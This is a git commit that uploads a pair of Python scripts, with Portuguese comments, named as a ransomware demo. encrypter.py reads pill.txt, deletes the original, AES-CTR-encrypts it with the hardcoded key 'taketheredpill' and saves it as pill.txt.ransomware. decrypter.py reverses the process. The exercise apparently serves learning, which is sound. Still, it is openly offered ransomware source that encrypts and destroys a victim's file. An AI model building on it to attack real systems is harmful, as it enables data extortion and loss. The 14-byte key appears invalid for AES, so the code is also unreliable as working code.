a9287457435af1380d25ef1cd2ac8d0c145de61f
araujosi <166968343+araujosi@users.noreply.github.com>
2024-04-14 18:14:42 -0300

    Add files via upload

---
+++ decrypter.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python
+
+import os
+import pyaes
+
+# Abrir o arquivo criptografado
+file_name = "pill.txt.ransomware"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+# Chave para descriptografia
+key = b"taketheredpill"
+aes = pyaes.AESModeOfOperationCTR(key)
+decrypt_data = aes.decrypt(file_data)
+
+# Remover o arquivo criptografado
+os.remove(file_name)
+
+## criar o arquivo descriptografado
+new_file = "pill.txt"
+new_file = open(f'{new_file}', "wb")
+new_file.write(decrypt_data)
+new_file.close()
---
+++ encrypter.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+
+import os
+import pyaes
+
+# Abrir o arquivo a ser criptografado
+file_name = "pill.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+# Remover o arquivo
+os.remove(file_name)
+
+# Chave de criptografia
+key = b"taketheredpill"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+# Criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+# Salvar o arquivo criptografado
+new_file = file_name + ".ransomware"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
